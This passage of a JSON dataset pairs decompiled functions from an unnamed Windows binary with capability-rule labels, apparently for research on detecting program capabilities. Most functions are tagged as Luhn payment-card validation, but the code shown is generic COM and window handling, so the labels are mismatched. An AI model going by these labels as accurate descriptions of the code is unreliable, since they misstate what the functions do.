*extraout_ECX[0x13];\n            uVar2 = (**(*extraout_ECX + 0x130))();\n            (**(iVar1 + 0xa0))(uVar2);\n        }\n    }\n    piVar3 = extraout_ECX;\n    if (extraout_ECX[0x13] != 0) {\n        while ((piVar3[0xf] & 0x100U) == 0) {\n            piVar3[0xf] = piVar3[0xf] | 0x100;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(piVar3[8]);\n            piVar3 = fcn.0041e67e(uVar2);\n            piVar4 = piVar3;\n            if (piVar3 != NULL) {\n                piVar4 = piVar3[8];\n            }\n            uVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(piVar4, 0xfffffff0);\n            if (((uVar5 & 0x40000000) == 0) || (piVar3 == NULL)) break;\n        }\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 564
    },
    "0043bb5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bb5f(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    fcn.0043b5c4(arg_8h, arg_ch + 8, arg_ch, 0, arg_10h, arg_14h, arg_18h, arg_1ch, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 112
    },
    "0043c5a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043c5a3(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    \n    if (((arg_8h == 0) || (arg_10h == 0)) || (arg_18h == NULL)) {\n        uVar1 = 0x80004005;\n    }\n    else {\n        uVar1 = (**(*arg_18h + 0x10))\n                          (arg_18h, (*(arg_8h + 0x24) != 0) * '\\x02' + '\\x02', arg_ch, arg_8h, arg_14h, arg_10h, 0);\n        if (arg_ch != 0) {\n            puVar2 = arg_8h + 0x14;\n            do {\n                fcn.004170df(*puVar2);\n                puVar2 = puVar2 + 0xd;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 267
    },
    "0043c7ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0043c7ed(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e78(0xc);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    uVar3 = *(unaff_EBP + 0x10);\n    uVar1 = *(unaff_EBP + 0xc);\n    *(extraout_ECX + 8) = uVar1;\n    *(extraout_ECX + 0x18) = uVar3;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    fcn.00459330(uVar1, 0, uVar3);\n    fcn.004170df(*(extraout_ECX + 0xc));\n    iVar2 = *(unaff_EBP + 8) * 0x34;\n    *(extraout_ECX + 0xc) = 0;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.004170b4(-(iVar2 >> 0x20 != 0) | iVar2);\n    *(extraout_ECX + 0xc) = uVar3;\n    if (*(extraout_ECX + 0xc) != 0) {\n        *(extraout_ECX + 0x10) = *(unaff_EBP + 8);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 420
    },
    "0043c8f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c8f7(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *in_ECX;\n    \n    (**(*in_ECX + 0xc4))(arg_8h, arg_ch + 8, arg_ch, 0, arg_10h, arg_14h, arg_18h, arg_1ch, 0, 0, 0);\n    return;\n}\n",
        "token_count": 122
    },
    "0043cc8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cc8f(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uStack24;\n    uint *puStack20;\n    int32_t *var_4h;\n    \n    puStack20 = 0x10;\n    puVar1 = param_1 + 0x78;\n    uStack24 = 0;\n    var_4h = param_1;\n    fcn.00459330(puVar1);\n    puVar2 = *(param_1 + 0x50);\n    var_4h = NULL;\n    *puVar1 = 0x10;\n    if (puVar2 == NULL) {\n        uStack24 = 0x4a8690;\n        puStack20 = &stack0xfffffffc;\n        fcn.00456b8d(&uStack24, 0x49ed44);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    puStack20 = &var_4h;\n    uStack24 = 0x496794;\n    iVar4 = (***puVar2)(puVar2);\n    if (-1 < iVar4) {\n        (**(*var_4h + 0xc))(var_4h, puVar1);\n        (**(*var_4h + 8))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "0043d742": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043d742(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    param_1[2] = param_4 + param_2;\n    *param_1 = param_2;\n    param_1[1] = param_3;\n    param_1[3] = param_5 + param_3;\n    return;\n}\n",
        "token_count": 107
    },
    "0043dbd7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043dbd7(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_2 * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    *param_3 = *puVar1;\n    param_3[1] = puVar1[1];\n    param_3[2] = puVar1[2];\n    param_3[3] = puVar1[3];\n    *(param_3 + 4) = *(puVar1 + 4);\n    *(param_3 + 0x12) = *(puVar1 + 0x12);\n    return;\n}\n",
        "token_count": 176
    },
    "0043dff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043dff0(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_retaddr;\n    \n    cVar1 = fcn.0043c682(&stack0x00000004);\n    if (cVar1 == '\\0') {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(unaff_retaddr * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n    }\n    return iVar2;\n}\n",
        "token_count": 132
    },
    "0043e11c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e11c(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t in_ECX;\n    \n    if (arg_1ch == 0) {\n        arg_1ch = 0;\n    }\n    else {\n        arg_1ch = arg_1ch - *(in_ECX + 8);\n    }\n    if (arg_18h == 0) {\n        arg_18h = 0;\n    }\n    else {\n        arg_18h = arg_18h - *(in_ECX + 8);\n    }\n    fcn.0043df15(*(in_ECX + 0x14) * 0x34 + *(in_ECX + 0xc), arg_8h, arg_ch, arg_10h, 0, 0, 0, arg_14h - *(in_ECX + 8), \n                 arg_18h, arg_1ch, 0);\n    *(in_ECX + 0x14) = *(in_ECX + 0x14) + 1;\n    return;\n}\n",
        "token_count": 269
    },
    "0043e188": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043e188(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45();\n    iVar4 = *(extraout_ECX + 0x3c);\n    iVar1 = *(extraout_ECX + 0x34);\n    *(unaff_EBP + -0x14) = *(extraout_ECX + 0x38) - *(extraout_ECX + 0x30);\n    *(unaff_EBP + -0x10) = iVar4 - iVar1;\n    fcn.0041a31b(0);\n    *(unaff_EBP + -4) = 0;\n    fcn.0042e964(unaff_EBP + -0x14);\n    piVar2 = *(extraout_ECX + 0x50);\n    if (piVar2 == NULL) {\n        var_10h = 0x4a8690;\n        fcn.00456b8d(&var_10h, 0x49ed44);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    var_10h = 1;\n    iVar4 = (**(*piVar2 + 0x44))(piVar2);\n    if (-1 < iVar4) {\n        iVar4 = (**(**(extraout_ECX + 0x50) + 0x48))(*(extraout_ECX + 0x50), 1, unaff_EBP + -0x14);\n        if (-1 < iVar4) {\n            fcn.0042e9f2(unaff_EBP + -0x14);\n            *(extraout_ECX + 0x38) = *(extraout_ECX + 0x30) + *(unaff_EBP + -0x14);\n            *(extraout_ECX + 0x3c) = *(extraout_ECX + 0x34) + *(unaff_EBP + -0x10);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041a36f();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 572
    },
    "0043f9a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f9a9(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uStack24;\n    uint *puStack20;\n    int32_t **var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    if ((param_1[2] != 0x80010001) && (piVar1 = *param_1,  piVar1 != NULL)) {\n        var_4h = param_1;\n        if (piVar1[0x14] == 0) {\n            uStack24 = 0x4a8690;\n            fcn.00456b8d(&uStack24, 0x49ed44);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        puStack20 = &var_4h;\n        uStack24 = 0x494e54;\n        iVar3 = (***piVar1[0x14])(piVar1[0x14]);\n        if (iVar3 < 0) {\n            iVar3 = fcn.0043d8f6();\n            if (iVar3 != 0) {\n                uVar4 = 0xd;\n                if (param_1[3][0x24] != 0) {\n                    uVar4 = 0x800d;\n                }\n                (**(**param_1 + 0x70))(*param_1, param_1[2], uVar4, iVar3);\n            }\n        }\n        else {\n            (*(*var_4h)[3])(var_4h, param_1[2], param_1[3] != NULL, param_1 + 4);\n            (*(*var_4h)[2])(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 419
    },
    "0043fb7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043fb7e(uint32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((arg_8h & 3) == 0) || (uVar1 = 0,  arg_ch == 0)) {\n        return 0;\n    }\ncode_r0x0043fba2:\n    // switch table (31 cases) at 0x43fc16\n    switch(*arg_10h) {\n    case 1:\n        var_4h = 3;\n        break;\n    case 2:\n    case 0x14:\n        var_4h = 5;\n        break;\n    case 3:\n    case 9:\n    case 10:\n    case 0x17:\n        var_4h = 6;\n        break;\n    default:\n        goto code_r0x0043fbb8;\n    case 6:\n    case 7:\n    case 8:\n    case 0xb:\n    case 0xc:\n    case 0xf:\n    case 0x10:\n    case 0x13:\n    case 0x15:\n        var_4h = 7;\n        break;\n    case 0x18:\n        var_4h = 2;\n        break;\n    case 0x19:\n        var_4h = 1;\n        break;\n    case 0x1f:\n        var_4h = 4;\n    }\n    var_20h = 0xffffffff;\n    var_24h = 3;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    var_8h = arg_14h;\n    fcn.0043cecc(&var_24h);\n    return var_ch;\ncode_r0x0043fbb8:\n    uVar1 = uVar1 + 1;\n    arg_10h = arg_10h + 9;\n    if (arg_ch <= uVar1) {\n        return 0;\n    }\n    goto code_r0x0043fba2;\n}\n",
        "token_count": 540
    },
    "0043fda7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0043fda7(int32_t param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t unaff_retaddr;\n    \n    uVar1 = fcn.0043c682(&param_2);\n    if (uVar1 == '\\0') {\n        uVar1 = uVar1 & 0xffffff00;\n    }\n    else {\n        puVar2 = *(unaff_retaddr * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n        *param_2 = *puVar2;\n        *(param_2 + 1) = *(puVar2 + 1);\n        uVar1 = CONCAT31(unaff_retaddr * 0x30 >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "0043fddc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0043fddc(int32_t param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t unaff_retaddr;\n    \n    uVar1 = fcn.0043c682(&param_2);\n    if (uVar1 == '\\0') {\n        uVar1 = uVar1 & 0xffffff00;\n    }\n    else {\n        puVar2 = *(unaff_retaddr * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n        *param_2 = *puVar2;\n        *(param_2 + 1) = *(puVar2 + 1);\n        uVar1 = CONCAT31(unaff_retaddr * 0x30 >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "0043fe11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0043fe11(int32_t param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t unaff_retaddr;\n    \n    uVar1 = fcn.0043c682(&param_2);\n    if (uVar1 == '\\0') {\n        uVar1 = uVar1 & 0xffffff00;\n    }\n    else {\n        puVar2 = *(unaff_retaddr * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n        *param_2 = *puVar2;\n        param_2[1] = puVar2[1];\n        param_2[2] = puVar2[2];\n        param_2[3] = puVar2[3];\n        uVar1 = CONCAT31(unaff_retaddr * 0x30 >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 223
    },
    "0043ff87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0043ff87(int32_t param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t unaff_retaddr;\n    \n    uVar1 = fcn.0043c682(&param_2);\n    if (uVar1 == '\\0') {\n        uVar1 = uVar1 & 0xffffff00;\n    }\n    else {\n        puVar2 = *(unaff_retaddr * 0x30 + 4 + *(param_1 + 0x14)) + *(param_1 + 8);\n        *puVar2 = *param_2;\n        puVar2[1] = param_2[1];\n        puVar2[2] = param_2[2];\n        puVar2[3] = param_2[3];\n        uVar1 = CONCAT31(unaff_retaddr * 0x30 >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 223
    },
    "004414ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004414ee(void)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t **ppiVar5;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar6;\n    int32_t **in_FS_OFFSET;\n    uchar *puVar7;\n    int32_t *in_stack_ffffff78;\n    uchar *puStack132;\n    uchar *puStack128;\n    int32_t *piStack120;\n    int32_t *piStack116;\n    int32_t *piStack112;\n    int32_t *in_stack_ffffff94;\n    int32_t *piVar8;\n    uchar auStack104 [24];\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar auStack56 [24];\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ &stack0xffffff84;\n    puStack128 = 0x44150c;\n    fcn.00458e45();\n    piStack120 = extraout_ECX[4];\n    if (extraout_ECX[0x12] == 0) {\n        if (extraout_ECX[2] == NULL) goto code_r0x0044182c;\n        puStack128 = &stack0xffffff8c;\n        puStack132 = &stack0xffffff90;\n        in_stack_ffffff78 = 0x494ef4;\n        iVar3 = (**(*extraout_ECX[2] + 0xc))();\n        if (iVar3 < 0) goto code_r0x0044182c;\n        puStack128 = 0x497568;\n        puStack132 = &stack0xffffff98;\n        fcn.0043d804();\n        uStack72 = 0xffffffff;\n        in_stack_ffffff78 = 0x497490;\n        puVar7 = &stack0xffffffc8;\n        uStack80 = 0;\n        uStack76 = 0;\n        uStack68 = 0x18;\n        uStack64 = 0;\n        uStack60 = 0x1fb;\n        fcn.0043d804();\n        uStack24 = 0xffffffff;\n        uStack32 = 0x1c;\n        uStack28 = 0;\n        uStack20 = 0x20;\n        uStack16 = 0;\n        uStack12 = 0x1e;\n        iVar3 = (**(*piStack112 + 0x10))();\n        if (iVar3 < 0) {\n            (**(*piStack112 + 8))();\n            goto code_r0x0044182c;\n        }\n        iVar3 = (**(*piStack112 + 0x18))(piStack112, 0, 0);\n        if (iVar3 < 0) {\n            (**(*piStack112 + 8))(piStack112);\n            goto code_r0x0044182c;\n        }\n        extraout_ECX[5] = 0;\n        piStack116 = NULL;\n        extraout_ECX[4] = 0;\n        extraout_ECX[0xd] = 0;\n        (**(*piStack112 + 8))(piStack112);\n    }\n    else {\n        in_stack_ffffff78 = extraout_ECX[0x13];\n        puStack128 = &stack0xffffff94;\n        puStack132 = 0x496dc4;\n        iVar3 = (**(*in_stack_ffffff78 + 0x14))();\n        if (iVar3 < 0) goto code_r0x0044182c;\n        puStack128 = &stack0xffffff8c;\n        puStack132 = 0x4967e4;\n        piVar8 = in_stack_ffffff94;\n        iVar3 = (***in_stack_ffffff94)();\n        in_stack_ffffff78 = in_stack_ffffff94;\n        if (-1 < iVar3) {\n            piStack112 = NULL;\n            iVar3 = (**(*piStack116 + 0x10))();\n            in_stack_ffffff78 = in_stack_ffffff94;\n            if (-1 < iVar3) {\n                (**(*piStack112 + 0x14))();\n                (**(*piStack112 + 8))();\n                in_stack_ffffff78 = in_stack_ffffff94;\n            }\n            (**(*piStack116 + 8))();\n        }\n        in_stack_ffffff94 = piVar8;\n        iVar3 = fcn.004170b4();\n        if (iVar3 == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.00440d22();\n        }\n        extraout_ECX[0x14] = iVar3;\n        (**(*in_stack_ffffff94 + 8))();\n        if (*extraout_ECX[0x14] != NULL) {\n            puStack132 = 0x4415d2;\n            piStack120 = *extraout_ECX[0x14];\n            fcn.0043dbc2();\n        }\n        puStack128 = 0x4415d9;\n        iVar3 = fcn.004170b4();\n        if (iVar3 == 0) {\n            iVar3 = 0;\n        }\n        else {\n            piStack120 = NULL;\n            puStack132 = 0x4415eb;\n            iVar3 = fcn.0043c605();\n        }\n        extraout_ECX[0x15] = iVar3;\n        puStack128 = 0x4415fe;\n        fcn.00440eb5(*extraout_ECX[0x14]);\n        *(extraout_ECX[0x14] + 8) = extraout_ECX[0x15];\n        uVar1 = *(extraout_ECX[0x15] + 0xc);\n        extraout_ECX[4] = uVar1;\n        if (0x3333333 < uVar1) goto code_r0x0044182c;\n        puStack128 = uVar1 * 0x28;\n        puStack132 = 0x44162b;\n        in_stack_ffffff78 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)();\n        extraout_ECX[5] = in_stack_ffffff78;\n        if (in_stack_ffffff78 == NULL) {\n            puStack132 = 0x4a8560;\n            puStack128 = &stack0xffffff84;\n            fcn.00456b8d(&stack0xffffff7c, 0x49eca0);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        puStack128 = extraout_ECX[4] * 0x28;\n        puStack132 = NULL;\n        puVar7 = 0x44164c;\n        fcn.00459330();\n        puStack128 = 0x441657;\n        fcn.00440d44();\n        puStack128 = 0x44165f;\n        fcn.0043da6e();\n    }\n    in_stack_ffffff94 = NULL;\n    if (0 < extraout_ECX[4]) {\n        iVar3 = 0;\n        do {\n            puStack128 = 0x1c;\n            puStack132 = 0x44177c;\n            piStack116 = fcn.004170b4();\n            puStack128 = NULL;\n            if (piStack116 == NULL) {\n                uVar4 = 0;\n            }\n            else {\n                puStack132 = 0x441790;\n                uVar4 = fcn.00432450();\n            }\n            puStack128 = 0xffffffff;\n            in_stack_ffffff94 = in_stack_ffffff94 + 1;\n            *(iVar3 + 0x24 + extraout_ECX[5]) = uVar4;\n            iVar3 = iVar3 + 0x28;\n        } while (in_stack_ffffff94 < extraout_ECX[4]);\n    }\n    if (puVar7 != NULL) {\n        if (0 < piStack120) {\n            ppiVar6 = puVar7 + 0x24;\n            piStack116 = -0x24 - puVar7;\n            in_stack_ffffff94 = piStack120;\n            do {\n                piStack120 = (*ppiVar6)[1];\n                while (piStack120 != NULL) {\n                    puStack128 = &stack0xffffff88;\n                    puStack132 = 0x4417f3;\n                    ppiVar5 = fcn.0041c771();\n                    in_stack_ffffff78 = *ppiVar5;\n                    puStack132 = 0x1;\n                    puVar7 = 0x4417ff;\n                    (**(*extraout_ECX + 8))();\n                }\n                puStack128 = 0x44180b;\n                fcn.00432336();\n                if (*ppiVar6 != NULL) {\n                    puStack128 = 0x1;\n                    puStack132 = 0x441818;\n                    (**(**ppiVar6 + 4))();\n                }\n                ppiVar6 = ppiVar6 + 10;\n                in_stack_ffffff94 = in_stack_ffffff94 + -1;\n            } while (in_stack_ffffff94 != NULL);\n        }\n        puStack132 = 0x441829;\n        puStack128 = puVar7;\n        (*_sym.imp.ole32.dll_CoTaskMemFree)();\n    }\ncode_r0x0044182c:\n    *in_FS_OFFSET = in_stack_ffffff78;\n    piStack112 = 0x441844;\n    fcn.004566a8(in_stack_ffffff94);\n    return;\n}\n",
        "token_count": 2158
    },
    "004423bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: pvargDest\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.004423bf(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint pvargDest;\n    uint var_4h;\n    \n    fcn.00458e45(0x10);\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *extraout_ECX = vtable.CDataSourceControl.0;\n    pcVar1 = extraout_ECX[0x16];\n    *(unaff_EBP + -4) = 0;\n    if ((((pcVar1 != NULL) && (extraout_ECX[0x14] != NULL)) &&\n        (puVar2 = *extraout_ECX[0x14],  iVar5 = (***puVar2)(puVar2, 0x4967e4, unaff_EBP + -0x14),  -1 < iVar5)) &&\n       (piVar6 = *(unaff_EBP + -0x14),  piVar6 != NULL)) {\n        *(unaff_EBP + -0x10) = 0;\n        iVar5 = (**(*piVar6 + 0x10))(piVar6, 0x496ee4, unaff_EBP + -0x10);\n        if ((-1 < iVar5) && (piVar6 = *(unaff_EBP + -0x10),  piVar6 != NULL)) {\n            (**(*piVar6 + 0x18))(piVar6, extraout_ECX[0x16]);\n            (**(**(unaff_EBP + -0x10) + 8))(*(unaff_EBP + -0x10));\n        }\n        (**(**(unaff_EBP + -0x14) + 8))(*(unaff_EBP + -0x14));\n    }\n    while (((extraout_ECX[9] != NULL && (ppiVar3 = *(extraout_ECX[7] + 8),  ppiVar3 != NULL)) && (*ppiVar3 != NULL))) {\n        (**(**ppiVar3 + 0xbc))(ppiVar3[2], 0);\n        (*ppiVar3)[0x26] = 0;\n    }\n    *(unaff_EBP + -0x18) = extraout_ECX + 6;\n    fcn.00432336();\n    if (extraout_ECX[0x10] != NULL) {\n        iVar5 = 0;\n        pcVar1 = extraout_ECX[0xe];\n        if (0 < pcVar1) {\n            *(unaff_EBP + -0x10) = 0;\n            do {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(extraout_ECX[0x10] + *(unaff_EBP + -0x10));\n                *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 0x10;\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < extraout_ECX[0xe]);\n            pcVar1 = extraout_ECX[0xe];\n        }\n        if (pcVar1 != NULL) {\n            fcn.004170df(extraout_ECX[0xf]);\n            fcn.004170df(extraout_ECX[0x10]);\n        }\n    }\n    piVar6 = extraout_ECX[2];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    piVar6 = extraout_ECX[3];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    if (extraout_ECX[5] != NULL) {\n        pcVar1 = extraout_ECX[4];\n        *(unaff_EBP + -0x10) = 0;\n        if (0 < pcVar1) {\n            iVar5 = 0;\n            do {\n                iVar4 = *(*(extraout_ECX[5] + iVar5 + 0x24) + 4);\n                *(unaff_EBP + -0x14) = iVar4;\n                while (iVar4 != 0) {\n                    piVar6 = fcn.0041c771(unaff_EBP + -0x14);\n                    iVar4 = *(unaff_EBP + -0x14);\n                    *(*piVar6 + 0x98) = 0;\n                }\n                fcn.00432336();\n                if (*(extraout_ECX[5] + iVar5 + 0x24) != NULL) {\n                    (**(**(extraout_ECX[5] + iVar5 + 0x24) + 4))(1);\n                }\n                *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 1;\n                iVar5 = iVar5 + 0x28;\n            } while (*(unaff_EBP + -0x10) < extraout_ECX[4]);\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[5]);\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[0xd]);\n    }\n    if (extraout_ECX[0x15] != NULL) {\n        fcn.00440dab(*extraout_ECX[0x14]);\n        fcn.0043c62e();\n    }\n    pcVar1 = extraout_ECX[0x15];\n    if (pcVar1 != NULL) {\n        fcn.0043c62e();\n        fcn.004170df(pcVar1);\n    }\n    pcVar1 = extraout_ECX[0x14];\n    if (pcVar1 != NULL) {\n        fcn.00442182();\n        fcn.004170df(pcVar1);\n    }\n    piVar6 = extraout_ECX[0x13];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    piVar6 = extraout_ECX[0x12];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00432473();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 1538
    },
    "00442712": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00442712(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t *puVar5;\n    uint arg_8h;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY172;\n    uchar *puStackY168;\n    uint uStack112;\n    ulong uStack104;\n    ushort uStack96;\n    uint32_t uStack88;\n    ushort uStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    int16_t iStack60;\n    uint16_t uStack58;\n    uint16_t uStack56;\n    uint uStack36;\n    uint32_t uStack32;\n    ushort uStack28;\n    uchar uStack26;\n    uchar uStack25;\n    uint16_t uStack24;\n    uint16_t uStack22;\n    uint16_t uStack20;\n    uchar uStack18;\n    uchar uStack17;\n    uint uStack16;\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ &stack0xffffff90;\n    uStack112 = 0xcc;\n    fcn.00458e45();\n    uStack36 = param_1;\n    uStack64 = 0;\n    if (*(extraout_ECX + 0x48) != 0) goto code_r0x00442751;\n    do {\n        fcn.0041901a();\ncode_r0x00442751:\n    } while (*(extraout_ECX + 0x54) == 0);\n    fcn.0043376f();\n    uStack32 = 3;\n    fcn.00440150();\n    if ((uStack32 == 3) || (cVar2 = fcn.0043dfbf(), 